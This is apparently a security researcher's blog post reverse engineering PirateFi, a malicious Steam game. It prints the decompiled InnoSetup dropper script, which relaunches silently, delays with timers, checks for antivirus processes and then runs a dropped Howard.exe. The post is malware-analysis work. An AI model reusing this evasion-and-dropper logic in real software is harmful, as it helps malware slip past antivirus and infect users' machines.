---
description: Between May 2024 and January 2026, threat actors have been observed targeting Steam users by uploading malicious games to the Steam platform. At the time of writing, the FBI are currently investigating this. Affected games include BlockBlasters, Chemia, Dashverse/DashFPS, Lampy, Lunara, PirateFi, and Tokenova. In this post, we are reverse engineering PirateFi.
---

## Picking Apart PirateFi: Steam Game Malware

In February 2025, a new game hit the Steam marketplace in beta, titled "PirateFi". The free-to-play game was somewhat underwhelming due to the fact that it was uploaded in order to steal victims' information and hijack user accounts.

The game was taken down from the Steam marketplace, but the change history can be found here: https://steamdb.info/app/3476470/history/

Upon review, **Changelist #27351505** caught my eye due to the following line, showing a heavily embedded vbs script being added:

![Image](https://raw.githubusercontent.com/MZHeader/MZHeader.github.io/refs/heads/main/assets/2026-03-15%2013_30_44-Desktop%20-%20File%20Explorer.png)

This directory within the game files contains several launchers that ultimately execute Pirate.exe.

The directory contains the following files:

| Filename      | Note      |
| ------------- | ------------- |
| piratefi.vbs | Launches piratefi.bat |
| piratefi.bat | Launches batch2.vbs |
| batch2.vbs | Launches batch2.bat |
| batch2.bat | Launches Pirate.exe |
| Pirate.exe | Main Executable Payload |
| Pirate | Directory |
| Engine | Directory |

Pirate.exe is a InnoSetup executable, the contents of which can be extracted with the following Binary Refinery pipeline:
```
ef Pirate.exe [| xt -j | d2p ]
```
This  will produce three directories - data, embedded and meta.

embedded/script.ps 


<details>
<summary>embedded/script.ps</summary>
```
  typedef Boolean = U08
typedef Integer = S32
typedef TExecWait = U08
typedef TSetupStep = U08

external function Exec(Filename: AnsiString, Params: AnsiString, WorkingDir: AnsiString, ShowCmd: Integer, Wait: TExecWait, *ResultCode: Integer): Boolean
external function ExpandConstant(S: AnsiString): AnsiString
external function ShellExec(Verb: AnsiString, Filename: AnsiString, Params: AnsiString, WorkingDir: AnsiString, ShowCmd: Integer, Wait: TExecWait, *ErrorCode: Integer): Boolean
external function WizardSilent(): Boolean
external function __stdcall kernel32::GetTickCount()
external procedure __stdcall kernel32::Sleep(Milliseconds)
external function __stdcall shell32::ShellExecuteW(Argument1, Argument2, Argument3, Argument4, Argument5, Argument6)

procedure !MAIN()
begin
  0x000   0  Ret
end;

function IEMONITOR(Argument1: UnicodeString): Boolean
begin
  0x000   0  PushType      S32
  0x005   1  PushType      UnicodeString
  0x00A   2  PushType      UnicodeString
  0x00F   3  Assign        LocalVar3 := 'tasklist /FI "IMAGENAME eq '
  0x039   3  Calculate     LocalVar3 += Argument1
  0x045   3  Calculate     LocalVar3 += '" /FO CSV /NH | find /I "'
  0x06E   3  Calculate     LocalVar3 += Argument1
  0x07A   3  Calculate     LocalVar3 += '"'
  0x087   3  Assign        LocalVar2 := LocalVar3
  0x092   3  Pop
  0x093   2  PushType      Boolean
  0x098   3  PushType      Pointer
  0x09D   4  SetPtr        LocalVar4 := LocalVar1
  0x0A8   4  PushType      TExecWait
  0x0AD   5  Assign        LocalVar5 := 1
  0x0B9   5  PushType      S32
  0x0BE   6  Assign        LocalVar6 := 0
  0x0CD   6  PushType      UnicodeString
  0x0D2   7  Assign        LocalVar7 := ''
  0x0E1   7  PushType      UnicodeString
  0x0E6   8  PushType      UnicodeString
  0x0EB   9  Assign        LocalVar9 := '/C '
  0x0FD   9  Calculate     LocalVar9 += LocalVar2
  0x109   9  Assign        LocalVar8 := LocalVar9
  0x114   9  Pop
  0x115   8  PushType      UnicodeString
  0x11A   9  Assign        LocalVar9 := 'cmd.exe'
  0x130   9  PushVar       LocalVar3
  0x136  10  Call          Exec
  0x13B  10  Pop
  0x13C   9  Pop
  0x13D   8  Pop
  0x13E   7  Pop
  0x13F   6  Pop
  0x140   5  Pop
  0x141   4  Pop
  0x142   3  SetFlag       !LocalVar3
  0x149   3  Pop
  0x14A   2  JumpFlag      JumpDestination01
  0x14F   2  Compare       ReturnValue := LocalVar1 == 0
  0x164   2  Jump          JumpDestination02
JumpDestination01:
  0x169   2  Assign        ReturnValue := 0
JumpDestination02:
  0x175   2  Ret
end;

procedure GETTICKCOUNTPAUSE(Argument1: S32)
begin
  0x000   0  PushType      U32
  0x005   1  PushType      U32
  0x00A   2  PushType      U32
  0x00F   3  PushType      S32
  0x014   4  Assign        LocalVar4 := Argument1
  0x01F   4  Calculate     LocalVar4 *= 1000
  0x02F   4  Assign        LocalVar3 := LocalVar4
  0x03A   4  Pop
  0x03B   3  PushVar       LocalVar1
  0x041   4  Call          kernel32::GetTickCount
  0x046   4  Pop
  0x047   3  PushType      Boolean
JumpDestination01:
  0x04C   4  PushVar       LocalVar2
  0x052   5  Call          kernel32::GetTickCount
  0x057   5  Pop
  0x058   4  PushType      U32
  0x05D   5  Assign        LocalVar5 := LocalVar2
  0x068   5  Calculate     LocalVar5 -= LocalVar1
  0x074   5  Compare       LocalVar4 := LocalVar5 >= LocalVar3
  0x085   5  Pop
  0x086   4  JumpFalse     JumpDestination01, LocalVar4
  0x090   4  Pop
  0x091   3  Ret
end;

procedure CONTINUEINSTALL()
begin
  0x000   0  PushType      Boolean
  0x005   1  PushType      UnicodeString
  0x00A   2  Assign        LocalVar2 := 'wrsa.exe'
  0x021   2  PushVar       LocalVar1
  0x027   3  Call          IEMONITOR
  0x02C   3  Pop
  0x02D   2  Pop
  0x02E   1  JumpTrue      JumpDestination01, LocalVar1
  0x038   1  PushType      Boolean
  0x03D   2  PushType      UnicodeString
  0x042   3  Assign        LocalVar3 := 'opssvc.exe'
  0x05B   3  PushVar       LocalVar2
  0x061   4  Call          IEMONITOR
  0x066   4  Pop
  0x067   3  Pop
  0x068   2  Calculate     LocalVar1 |= LocalVar2
  0x074   2  Pop
JumpDestination01:
  0x075   1  JumpTrue      JumpDestination02, LocalVar1
  0x07F   1  PushType      Boolean
  0x084   2  PushType      UnicodeString
  0x089   3  Assign        LocalVar3 := 'avastui.exe'
  0x0A3   3  PushVar       LocalVar2
  0x0A9   4  Call          IEMONITOR
  0x0AE   4  Pop
  0x0AF   3  Pop
  0x0B0   2  Calculate     LocalVar1 |= LocalVar2
  0x0BC   2  Pop
JumpDestination02:
  0x0BD   1  JumpTrue      JumpDestination03, LocalVar1
  0x0C7   1  PushType      Boolean
  0x0CC   2  PushType      UnicodeString
  0x0D1   3  Assign        LocalVar3 := 'avgui.exe'
  0x0E9   3  PushVar       LocalVar2
  0x0EF   4  Call          IEMONITOR
  0x0F4   4  Pop
  0x0F5   3  Pop
  0x0F6   2  Calculate     LocalVar1 |= LocalVar2
  0x102   2  Pop
JumpDestination03:
  0x103   1  JumpTrue      JumpDestination04, LocalVar1
  0x10D   1  PushType      Boolean
  0x112   2  PushType      UnicodeString
  0x117   3  Assign        LocalVar3 := 'nswscsvc.exe'
  0x132   3  PushVar       LocalVar2
  0x138   4  Call          IEMONITOR
  0x13D   4  Pop
  0x13E   3  Pop
  0x13F   2  Calculate     LocalVar1 |= LocalVar2
  0x14B   2  Pop
JumpDestination04:
  0x14C   1  JumpTrue      JumpDestination05, LocalVar1
  0x156   1  PushType      Boolean
  0x15B   2  PushType      UnicodeString
  0x160   3  Assign        LocalVar3 := 'sophoshealth.exe'
  0x17F   3  PushVar       LocalVar2
  0x185   4  Call          IEMONITOR
  0x18A   4  Pop
  0x18B   3  Pop
  0x18C   2  Calculate     LocalVar1 |= LocalVar2
  0x198   2  Pop
JumpDestination05:
  0x199   1  SetFlag       !LocalVar1
  0x1A0   1  Pop
  0x1A1   0  JumpFlag      JumpDestination06
  0x1A6   0  PushType      U32
  0x1AB   1  Assign        LocalVar1 := 193000
  0x1BA   1  Call          kernel32::Sleep
  0x1BF   1  Pop
JumpDestination06:
  0x1C0   0  Ret
end;

function InitializeSetup(): Boolean
begin
  0x000   0  PushVar       ReturnValue
  0x006   1  Call          WizardSilent
  0x00B   1  Pop
  0x00C   0  PushType      Boolean
  0x011   1  Assign        LocalVar1 := ReturnValue
  0x01C   1  BooleanNot    LocalVar1
  0x022   1  SetFlag       !LocalVar1
  0x029   1  Pop
  0x02A   0  JumpFlag      JumpDestination01
  0x02F   0  PushType      Boolean
  0x034   1  PushType      S32
  0x039   2  PushType      S32
  0x03E   3  Assign        LocalVar3 := 0
  0x04D   3  PushType      UnicodeString
  0x052   4  Assign        LocalVar4 := ''
  0x061   4  PushType      UnicodeString
  0x066   5  Assign        LocalVar5 := ' /VERYSILENT'
  0x081   5  PushType      UnicodeString
  0x086   6  PushType      UnicodeString
  0x08B   7  Assign        LocalVar7 := '{srcexe}'
  0x0A2   7  PushVar       LocalVar6
  0x0A8   8  Call          ExpandConstant
  0x0AD   8  Pop
  0x0AE   7  Pop
  0x0AF   6  PushType      UnicodeString
  0x0B4   7  Assign        LocalVar7 := ''
  0x0C3   7  PushType      S32
  0x0C8   8  Assign        LocalVar8 := 0
  0x0D7   8  PushVar       LocalVar2
  0x0DD   9  Call          shell32::ShellExecuteW
  0x0E2   9  Pop
  0x0E3   8  Pop
  0x0E4   7  Pop
  0x0E5   6  Pop
  0x0E6   5  Pop
  0x0E7   4  Pop
  0x0E8   3  Pop
  0x0E9   2  Compare       LocalVar1 := LocalVar2 <= 32
  0x0FE   2  Pop
  0x0FF   1  SetFlag       !LocalVar1
  0x106   1  Pop
  0x107   0  JumpFlag      JumpDestination01
  0x10C   0  Assign        ReturnValue := 1
JumpDestination01:
  0x118   0  Ret
end;

procedure WDK()
begin
  0x000   0  PushType      S32
  0x005   1  PushType      Boolean
  0x00A   2  PushType      Pointer
  0x00F   3  SetPtr        LocalVar3 := LocalVar1
  0x01A   3  PushType      TExecWait
  0x01F   4  Assign        LocalVar4 := 0
  0x02B   4  PushType      S32
  0x030   5  Assign        LocalVar5 := 0
  0x03F   5  PushType      UnicodeString
  0x044   6  Assign        LocalVar6 := ''
  0x053   6  PushType      UnicodeString
  0x058   7  Assign        LocalVar7 := ''
  0x067   7  PushType      UnicodeString
  0x06C   8  PushType      UnicodeString
  0x071   9  Assign        LocalVar9 := '{tmp}\\Howard.exe'
  0x090   9  PushVar       LocalVar8
  0x096  10  Call          ExpandConstant
  0x09B  10  Pop
  0x09C   9  Pop
  0x09D   8  PushType      UnicodeString
  0x0A2   9  Assign        LocalVar9 := ''
  0x0B1   9  PushVar       LocalVar2
  0x0B7  10  Call          ShellExec
  0x0BC  10  Pop
  0x0BD   9  Pop
  0x0BE   8  Pop
  0x0BF   7  Pop
  0x0C0   6  Pop
  0x0C1   5  Pop
  0x0C2   4  Pop
  0x0C3   3  Pop
  0x0C4   2  Pop
  0x0C5   1  Ret
end;

procedure CurStepChanged(CurStep: TSetupStep)
begin
  0x000   0  PushType      Boolean
  0x005   1  Compare       LocalVar1 := Argument1 == 2
  0x017   1  SetFlag       !LocalVar1
  0x01E   1  Pop
  0x01F   0  JumpFlag      JumpDestination01
  0x024   0  PushType      U32
  0x029   1  Assign        LocalVar1 := 3000
  0x038   1  Call          kernel32::Sleep
  0x03D   1  Pop
  0x03E   0  PushType      S32
  0x043   1  Assign        LocalVar1 := 8
  0x052   1  Call          GETTICKCOUNTPAUSE
  0x057   1  Pop
  0x058   0  Call          CONTINUEINSTALL
  0x05D   0  Call          WDK
JumpDestination01:
  0x062   0  Ret
end;
```
</details>
